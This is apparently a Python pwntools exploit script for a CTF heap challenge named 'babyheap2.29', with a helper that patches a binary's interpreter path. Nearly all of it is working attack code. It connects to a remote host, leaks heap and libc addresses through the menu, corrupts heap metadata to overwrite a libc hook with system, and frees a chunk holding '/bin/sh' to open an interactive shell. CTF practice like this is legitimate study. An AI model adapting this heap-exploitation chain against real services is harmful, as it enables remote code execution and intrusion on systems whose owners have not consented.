#!/usr/bin/env python
# coding=utf-8
__author__="cpegg"
from pwn import *
import os
def change_ld(binary, ld):
    """
    Force to use assigned new ld.so by changing the binary
    """
    if not os.access(ld, os.R_OK): 
        log.failure("Invalid path {} to ld".format(ld))
        return None
 
         
    if not isinstance(binary, ELF):
        if not os.access(binary, os.R_OK): 
            log.failure("Invalid path {} to binary".format(binary))
            return None
        binary = ELF(binary)
 
 
    for segment in binary.segments:
        if segment.header['p_type'] == 'PT_INTERP':
            size = segment.header['p_memsz']
            addr = segment.header['p_paddr']
            data = segment.data()
            if size <= len(ld):
                log.failure("Failed to change PT_INTERP from {} to {}".format(data, ld))
                return None
            binary.write(addr, ld.ljust(size, '\0'))
            if not os.access('/tmp/pwn', os.F_OK): os.mkdir('/tmp/pwn')
            path = '/tmp/pwn/{}_debug'.format(os.path.basename(binary.path))
            if os.access(path, os.F_OK): 
                os.remove(path)
                info("Removing exist file {}".format(path))
            binary.save(path)    
            os.chmod(path, 0b111000000) #rwx------
    success("PT_INTERP has changed from {} to {}. Using temp file {}".format(data, ld, path)) 
    return ELF(path)
#example
local=1
if local:
    p=process('./babyheap2.29',aslr=False)
else:
    elf = change_ld('./babyheap2.29', './ld.so')
    p = elf.process(env={'LD_PRELOAD':'./libc.so.6'})

#p=process('./pwn_debug',env={"LD_PRELOAD":"./test/libc.so.6"},aslr=False)

p=remote("192.168.201.21",1904)
context.log_level='debug'
def add(size):
    p.sendlineafter("Command: ","1")
    p.sendlineafter("Size: ",str(size))
def upd(index,size,content):
    p.sendlineafter("Command: ","2")
    p.sendlineafter("Index: ",str(index))
    p.sendlineafter("Size: ",str(size))
    p.sendafter("Content: ",content)
def dell(index):
    p.sendlineafter("Command: ","3")
    p.sendlineafter("Index: ",str(index))
def view(index):
    p.sendlineafter("Command: ","4")
    p.sendlineafter("Index: ",str(index))
add(0x48)
for i in range(8):
    add(0xf8)
for i in range(8)[::-1]:
    dell(i+1)
for i in range(8):
    add(0xf8)
view(1)
p.recvuntil("[1]: ")
heapbase=u64(p.recv(6)+'\0\0')-0x4b0
upd(0,0x48,p64(heapbase+0x2a0)+p64(heapbase+0x2a0)+'a'*0x30+p64(0x50))
for i in range(7)[::-1]:
    dell(i+1)

upd(8,0x10,p64(heapbase+0x250)+p64(heapbase+0x250))
dell(8)
info("heapbase: 0x%x"%heapbase)
view(0)
p.recvuntil("[0]: ")
if local:
    libcbase=u64(p.recv(6)+'\0\0')-0x3ebca0
else:
    libcbase=u64(p.recv(6)+'\0\0')-0x1e4ca0
info("libcbase: 0x%x"%libcbase)
add(0x140)
dell(1)
if local:
    upd(0,0x8,p64(libcbase+0x3ed8e8))
else:
    upd(0,0x8,p64(libcbase+0x1E75A8))
add(0x140)

add(0x140)
if local:
    pass
else:
    upd(2,0x8,p64(libcbase+0x52FD0))
upd(1,8,'/bin/sh\x00')
#attach(p)
dell(1)
p.interactive()
